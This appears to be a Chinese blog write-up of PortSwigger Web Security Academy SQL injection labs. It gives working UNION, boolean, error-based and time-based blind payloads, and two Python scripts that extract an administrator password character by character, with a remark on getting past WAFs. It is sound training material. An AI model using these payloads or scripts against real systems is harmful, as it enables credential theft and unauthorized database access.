+<h2 id="确定可以回显字符串的列"><a href="#确定可以回显字符串的列" class="headerlink" title="确定可以回显字符串的列"></a>确定可以回显字符串的列</h2><p>通过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION+<span class="keyword">SELECT</span>+<span class="string">'A'</span>,<span class="literal">NULL</span><span class="comment">--+ //正常，说明第一列可以回显字符串</span></span><br><span class="line"><span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="literal">NULL</span>,<span class="string">'A'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>在MySQL中，查询数据库的版本可以通过下面的语句执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @@<span class="keyword">version</span> //mssql中也可用</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">version</span>()</span><br></pre></td></tr></table></figure>
+<p>查询到的数据库版本<br><img src="https://i.loli.net/2021/04/14/2Blp87zkN3FWdwo.png" alt="1.png"></p>
+<h1 id="SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="SQL injection attack, listing the database contents on non-Oracle databases"></a>SQL injection attack, listing the database contents on non-Oracle databases</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.<br>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.<br>To solve the lab, log in as the administrator user</p>
+</blockquote>
+<p>要求我们利用UNION SELECT 从数据库中找到表，再从表中找到administrator用户的密码</p>
+<h2 id="确定列数-5"><a href="#确定列数-5" class="headerlink" title="确定列数"></a>确定列数</h2><p>能用UNION SELECT 就先确定列数<br>ORDER BY 直接上</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 2<span class="comment">-- //正常</span></span><br><span class="line">ORDER BY 3<span class="comment">-- //错误</span></span><br></pre></td></tr></table></figure>
+<p>可以确定为两列。</p>
+<h2 id="确定能回显字符串的列-1"><a href="#确定能回显字符串的列-1" class="headerlink" title="确定能回显字符串的列"></a>确定能回显字符串的列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> <span class="string">'A'</span>,<span class="literal">NULL</span><span class="comment">-- //正常</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="string">'A'</span><span class="comment">-- //正常</span></span><br></pre></td></tr></table></figure>
+<p>说明两列都能回显字符串</p>
+<h2 id="确定后端DMBS"><a href="#确定后端DMBS" class="headerlink" title="确定后端DMBS"></a>确定后端DMBS</h2><p>可以尝试一下主流数据库查询版本的payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION%20SELECT%20@@version,%27A%27<span class="comment">-- //错误</span></span><br><span class="line">UNION%20SELECT%20version(),%27A%27<span class="comment">-- //成功</span></span><br></pre></td></tr></table></figure>
+<p>查询到后端DBMS为PostgreSQL<br><img src="https://i.loli.net/2021/04/14/PW7nT3ImFHtohug.png" alt="1.png"><br>这里稍微说下尝试查询DBMS的过程。<br>首先能用<code>UNION SELECT &#39;A&#39;,NULL--</code>进行字符串回显的确认<br>先排除MYSQL和ORACLE<br>MYSQL不能光用<code>--</code>注释(<code>--+</code>才是)<br>而ORACLE的UNION SELECT需要指定一个表</p>
+<p>再者通过<code>@@version</code>，执行错误，说明不是mssql<br>再尝试version()，发现是PostgreSQL</p>
+<h2 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h2><p>PostgreSQL中查询表名可以通过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> information_schema.tables</span><br><span class="line">针对题目的两列，可以做个小变形</span><br><span class="line"><span class="keyword">UNION</span>%<span class="number">20</span><span class="keyword">SELECT</span>%<span class="number">20</span>table_name,<span class="literal">NULL</span>%<span class="number">20</span><span class="keyword">FROM</span>%<span class="number">20</span>information_schema.tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>这样就可以查询到所有的表<br>根据经验，搜索包含user关键字的表，发现图中的表users_cmxisv比较符合预期<br><img src="https://i.loli.net/2021/04/14/WHQhLDvCUJEBdqT.png" alt="1.png"></p>
+<h2 id="查表中字段"><a href="#查表中字段" class="headerlink" title="查表中字段"></a>查表中字段</h2><p>有了要尝试的表名，可以尝试查询表中存在的字段<br>在PostgreSQL中，可以通过下面的payload来查表中的字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name = <span class="string">'TABLE-NAME-HERE'</span></span><br></pre></td></tr></table></figure>
+<p>本题针对具体情况做一个payload的小变形</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,NULL FROM information_schema.columns WHERE table_name = &apos;users_cmxisv&apos;--</span><br></pre></td></tr></table></figure>
+<p>发现疑似用户名和密码的字段<br><img src="https://i.loli.net/2021/04/14/6o9BfS574deiIOu.png" alt="Snipaste_2021-04-14_10-16-26.png"></p>
+<h2 id="取数据"><a href="#取数据" class="headerlink" title="取数据"></a>取数据</h2><p>尝试查询用户名和密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION%20SELECT%20username_ijprqp,password_ojcahk%20FROM%20users_cmxisv<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/14/ER4QoJDhL5wFC8a.png" alt="1.png"><br>也可以尝试用这个payload,用拼接字符串的方式显示感觉更加友好一些</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION%20SELECT%20NULL,username_ijprqp||%27~%27||password_ojcahk%20FROM%20users_cmxisv--</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/14/gTrZShNEo4k63vn.png" alt="2.png"></p>
+<h1 id="SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="SQL injection attack, listing the database contents on Oracle"></a>SQL injection attack, listing the database contents on Oracle</h1><h2 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.<br>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.<br>To solve the lab, log in as the administrator user.</p>
+</blockquote>
+<p>这道题也是要以administrator登录才可以过关<br>需要我们自己去查表名和列名。</p>
+<h2 id="确定列数-6"><a href="#确定列数-6" class="headerlink" title="确定列数"></a>确定列数</h2><p>可以使用UNION SELECT 就先确定ORDER BY</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 2<span class="comment">-- //正常</span></span><br><span class="line">ORDER BY 3<span class="comment">-- //错误</span></span><br></pre></td></tr></table></figure>
+<p>说明查询有两列</p>
+<h2 id="确定可以回显字符串的列-1"><a href="#确定可以回显字符串的列-1" class="headerlink" title="确定可以回显字符串的列"></a>确定可以回显字符串的列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UNION+<span class="keyword">SELECT</span>+<span class="literal">NULL</span>,<span class="literal">NULL</span><span class="comment">-- //错误</span></span><br><span class="line"><span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="literal">NULL</span>,<span class="literal">NULL</span>+<span class="keyword">FROM</span>+DUAL<span class="comment">-- //正常，说明DBMS是ORACLE</span></span><br><span class="line"><span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="string">'A'</span>,<span class="literal">NULL</span>+<span class="keyword">FROM</span>+DUAL<span class="comment">-- //正常，说明第一列可以回显字符串</span></span><br><span class="line"><span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="literal">NULL</span>,<span class="string">'A'</span>+<span class="keyword">FROM</span>+DUAL<span class="comment">-- //正常，说明第二列也可以回显字符串</span></span><br></pre></td></tr></table></figure>
+<h2 id="查表名-1"><a href="#查表名-1" class="headerlink" title="查表名"></a>查表名</h2><p>在ORACLE中可以通过下面的语句查询表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> all_tables</span><br><span class="line">对本题可以做一个小变形</span><br><span class="line"><span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+table_name,<span class="literal">NULL</span>+<span class="keyword">FROM</span>+all_tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>在查出的表中搜索带user字样的表<br>发现USERS_KQFWZM表比较符合预期<br><img src="https://i.loli.net/2021/04/14/Gh6nT7qa5esDUdM.png" alt="1.png"></p>
+<h2 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h2><p>在ORACLE中可以通过下面的句子查询表中的列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name = <span class="string">'TABLE-NAME-HERE'</span></span><br><span class="line">在本题中根据题目做个变形</span><br><span class="line"><span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+column_name,<span class="literal">NULL</span>+<span class="keyword">FROM</span>+all_tab_columns+<span class="keyword">WHERE</span>+table_name=<span class="string">'USERS_KQFWZM'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>发现USERNAME_TFBVCD和PASSWORD_YONVNW字段<br><img src="https://i.loli.net/2021/04/14/6h5w39izCVtLRdT.png" alt="1.png"></p>
+<h2 id="取数据-1"><a href="#取数据-1" class="headerlink" title="取数据"></a>取数据</h2><p>通过下面的sql语句查询用户名和密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> USERNAME_TFBVCD,PASSWORD_YONVNW <span class="keyword">FROM</span> USERS_KQFWZM<span class="comment">--</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> USERNAME_TFBVCD||<span class="string">'~'</span>||PASSWORD_YONVNW,<span class="literal">NULL</span> <span class="keyword">FROM</span> USERS_KQFWZM<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/14/yHibTF2YEBrWR4Q.png" alt="1.png"></p>
+<h1 id="Blind-SQL-injection-with-conditional-responses"><a href="#Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Blind SQL injection with conditional responses"></a>Blind SQL injection with conditional responses</h1><h2 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.<br>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a “Welcome back” message in the page if the query returns any rows.<br>The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.<br>To solve the lab, log in as the administrator user.</p>
+</blockquote>
+<p>注入点在Cookie上，给了表名和列名<br>找到administrator密码算过关<br>注入不会报错，如果条件为真则返回包里有Welcome back字段<br>这里需要bp来辅助一下</p>
+<h2 id="确定DBMS"><a href="#确定DBMS" class="headerlink" title="确定DBMS"></a>确定DBMS</h2><p>观察响应包的长短和使用的函数<br>lengthb是ORACLE的函数，这里不可用，可以排除ORACLE<br>length测试是可用的，由此排除mssql<br>注释是<code>--</code>排除MYSQL<br>推断DBMS为PostgreSQL<br><img src="https://i.loli.net/2021/04/14/Iw7asqm1KFhnNHY.png" alt="2.png"><br><img src="https://i.loli.net/2021/04/14/wgJ3vMoTfOe5uxh.png" alt="1.png"></p>
+<h2 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h2><p>对这种布尔盲注，一般采取的方法是逐个字符进行读取<br>采用下面的语句来判断字符是否正确</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QMSqoMmHRYNgy98F'and ascii(substr((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'administrator'</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><code>a&#39;and(ascii(substr((select password,null from users where username=&#39;administrator&#39;),1,1))&gt;1)--</code><br><img src="https://i.loli.net/2021/04/14/iAyRYjSQwqh836f.png" alt="1.png"><br><img src="https://i.loli.net/2021/04/14/g5wMYnPNXDvzSqh.png" alt="2.png"><br>通过数据包的回显长度，可以判断当前字符是否正确</p>
+<h2 id="自动化查询"><a href="#自动化查询" class="headerlink" title="自动化查询"></a>自动化查询</h2><p>写个脚本自动化查询密码。<br>注意替换相应url和cookie</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">'http'</span>: <span class="string">'127.0.0.1:8081'</span>,</span><br><span class="line">            <span class="string">'https'</span>: <span class="string">'127.0.0.1:8081'</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://ace71fd01e27687380d40009009400a6.web-security-academy.net/filter?category=Gift'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    low  = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    mid  = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low != high:</span><br><span class="line">        payload = &#123;<span class="string">'TrackingId'</span>: <span class="string">f'QMSqoMmHRYNgy98F\'and ascii(substr((select password from users where username=\'administrator\'),<span class="subst">&#123;i&#125;</span>,1)) &gt; <span class="subst">&#123;mid&#125;</span>--'</span>, <span class="string">'session'</span>:<span class="string">'3uV3ouz1hJ7mG2TAcSik9Zu3lj8zp5dG'</span>&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="comment"># res = requests.get(url, headers=headers, cookies=payload, proxies=proxies, verify=False)</span></span><br><span class="line">        res = requests.get(url, headers=headers, cookies=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Welcome back'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span>  </span><br><span class="line">    </span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+<p>查到的密码如下图<br><img src="https://i.loli.net/2021/04/14/4zMKAcIBRnJLaQU.png" alt="1.png"></p>
+<h1 id="Blind-SQL-injection-with-conditional-errors"><a href="#Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Blind SQL injection with conditional errors"></a>Blind SQL injection with conditional errors</h1><h2 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.<br>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.<br>The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.<br>To solve the lab, log in as the administrator user.</p>
+</blockquote>
+<p>这道题比上一道稍微有意思一点点<br>同样是盲注，但是这道题不会因为注入的条件改变而返回不一样的数据包<br>但是，这道题在DBMS报错的时候会有不一样的返回(500)<br>对这道题，采用的方法是 当条件为真的时候，引起一个错误<br>由此来推断查询的结果是真还是假的<br>同样可以用bp来辅助测试</p>
+<h2 id="判断DMBS"><a href="#判断DMBS" class="headerlink" title="判断DMBS"></a>判断DMBS</h2><p>这道题也需要判断DBMS以方便后续针对性的进行测试<br>首先证明一下，条件的真假不会对返回的结果有影响<br><img src="https://i.loli.net/2021/04/14/DJin2sxV3ryuhW6.png" alt="1.png"><br><img src="https://i.loli.net/2021/04/14/1QsZ7RpflMHBhqv.png" alt="2.png"><br>但是sql语句执行出错会返回500<br><img src="https://i.loli.net/2021/04/14/yMTOcRz7kYVWISm.png" alt="1.png"></p>
+<p>可以使用<code>--</code>注释，先排除DBMS是MYSQL的可能<br>len函数出错，排除mssql<br><img src="https://i.loli.net/2021/04/14/3RxnsK4q5OINPig.png" alt="1.png"><br>可用lengthb，判断为ORACLE<br><img src="https://i.loli.net/2021/04/14/GCq6tzF8g5RfY1W.png" alt="1.png"></p>
+<h2 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h2><p>要构造payload，需要学习一下<code>CASE WHEN ELSE END</code>的用法<br>其实这就是个SQL形式的<code>if else</code>语句,看个例子<br><img src="https://i.loli.net/2021/04/14/J3zWwKtCZbLAsio.png" alt="1.png"><br>再分析一下payload的意思</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xa3AukZaR6IZHzEn'and (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> to_char(<span class="number">1</span>/<span class="number">0</span>) <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span> <span class="keyword">FROM</span> dual)=<span class="string">'a'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>这里就是当 when括号里的条件为真的时候，结果为to_char函数的返回值<br>否则结果为NULL，因为是ORACLE,为了语法不出错还指定了一个dual表<br>这里需要稍微提一下，在ORACLE里面，and后面一定要是个布尔值<br>不像MYSQL这种，可以像(and 1)这么写。<br>所以在语句后面，加上了与’a’的比较，使之最终结果为布尔值</p>
+<hr>
+<p>接下来改变条件，当when后面的括号里条件为真<br>会触发错误的转换，返回500<br><img src="https://i.loli.net/2021/04/14/8lgHrdmSDsvN1nh.png" alt="1.png"><br><img src="https://i.loli.net/2021/04/14/2RHEeLK1865Zd4l.png" alt="2.png"><br>由此写出脚本，自动化查询用户密码<br>脚本里还有一种不使用注释符和and的平衡字符的方法<br>在实战中，某些关键字不能使用的时候，这种方法可能帮助绕过waf</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">'http'</span>: <span class="string">"127.0.0.1:8081"</span>,</span><br><span class="line">           <span class="string">'https'</span>: <span class="string">'127.0.0.1:8081'</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://ac841fa71f030f89802a01c2004d00f3.web-security-academy.net/'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    low  = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    mid  = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low != high:</span><br><span class="line">        payload = &#123;<span class="string">'TrackingId'</span>: <span class="string">f'irrik\'||(SELECT CASE WHEN ascii(SUBSTR(password,<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> THEN TO_CHAR(1/0) ELSE \'\' END FROM users WHERE username=\'administrator\')--'</span>,</span><br><span class="line">         <span class="string">'session'</span>:<span class="string">'3uV3ouz1hJ7mG2TAcSik9Zu3lj8zp5dG'</span>&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="comment"># res = requests.get(url, headers=headers, cookies=payload, proxies=proxies, verify=False)</span></span><br><span class="line">        res = requests.get(url, headers=headers, cookies=payload)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Internal Server Error'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span>  </span><br><span class="line">    </span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    另一payload如下</span></span><br><span class="line"><span class="string">    irrik'and(SELECT CASE WHEN ascii(SUBSTR(password,1,1))&gt;79 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')='a'--</span></span><br><span class="line"><span class="string">    如果用||来连接字符，则后边不需要等于号</span></span><br><span class="line"><span class="string">    如果用and来作为payload之间的连接，则需要在后边家上一个=的比较，使得结果为bool类型</span></span><br><span class="line"><span class="string">    '''</span></span><br></pre></td></tr></table></figure>
+<p>跑到的密码如下<br><img src="https://i.loli.net/2021/04/14/KmMNaB4ShDsWV1e.png" alt="1.png"></p>
+<h1 id="Blind-SQL-injection-with-time-delays"><a href="#Blind-SQL-injection-with-time-delays" class="headerlink" title="Blind SQL injection with time delays"></a>Blind SQL injection with time delays</h1><h2 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h2><p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.<br>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.<br>To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.</p>
+<p>这道题是时间盲注的<br>不管条件是真还是假，或是报错不报错返回都没有不同<br>但是可以直接直接用各大主流数据库的delay payload来测试<br>这题比较简单，用bp辅助一下，引起十秒延迟就算过关</p>
+<p>轮流测试以下的payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">irrik' || (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> <span class="string">'a'</span>||dbms_pipe.receive_message((<span class="string">'a'</span>),<span class="number">10</span>) <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span> <span class="keyword">FROM</span> dual) <span class="comment">--+</span></span><br><span class="line">irrik<span class="string">' and (IF (1=1) WAITFOR DELAY '</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">10</span><span class="string">') --+</span></span><br><span class="line"><span class="string">irrik'</span> || (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> pg_sleep(<span class="number">10</span>) <span class="keyword">ELSE</span> pg_sleep(<span class="number">0</span>) <span class="keyword">END</span>) <span class="comment">--+ //延时了</span></span><br><span class="line">irrik<span class="string">' and (IF(1=1,sleep(10),'</span>a<span class="string">')) --+</span></span><br></pre></td></tr></table></figure>
+<p>为什么用<code>--+</code>来注释呢<br>首先是MYSQL这样才算注释<br>其次呢，如果是DBMS <code>--</code>之后，后面的数据不影响</p>
+<p><img src="https://i.loli.net/2021/04/14/5x1FrfLUGmBNEPC.png" alt="1.png"></p>
+<h1 id="Blind-SQL-injection-with-time-delays-and-information-retrieval"><a href="#Blind-SQL-injection-with-time-delays-and-information-retrieval" class="headerlink" title="Blind SQL injection with time delays and information retrieval"></a>Blind SQL injection with time delays and information retrieval</h1><h2 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.<br>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.<br>The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.<br>To solve the lab, log in as the administrator user.</p>
+</blockquote>
+<p>这道题是上一道题的加强版，在延时的基础上要求提取出密码</p>
+<h2 id="确定DBMS-1"><a href="#确定DBMS-1" class="headerlink" title="确定DBMS"></a>确定DBMS</h2><p>确定的方法就是手工轮流试payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">irrik' || (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> <span class="string">'a'</span>||dbms_pipe.receive_message((<span class="string">'a'</span>),<span class="number">10</span>) <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span> <span class="keyword">FROM</span> dual) <span class="comment">--+</span></span><br><span class="line">irrik<span class="string">' and (IF (1=1) WAITFOR DELAY '</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">10</span><span class="string">') --+</span></span><br><span class="line"><span class="string">irrik'</span> || (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> pg_sleep(<span class="number">10</span>) <span class="keyword">ELSE</span> pg_sleep(<span class="number">0</span>) <span class="keyword">END</span>) <span class="comment">--+ //延时了</span></span><br><span class="line">irrik<span class="string">' and (IF(1=1,sleep(10),'</span>a<span class="string">')) --+</span></span><br></pre></td></tr></table></figure>
+<p>在哪里延时说明DBMS是哪个<br>在测试PostgreSQL的时候延时了，说明后端DBMS是PostgreSQL<br><img src="https://i.loli.net/2021/04/14/nj2Pi6qEBXIKpTD.png" alt="1.png"></p>
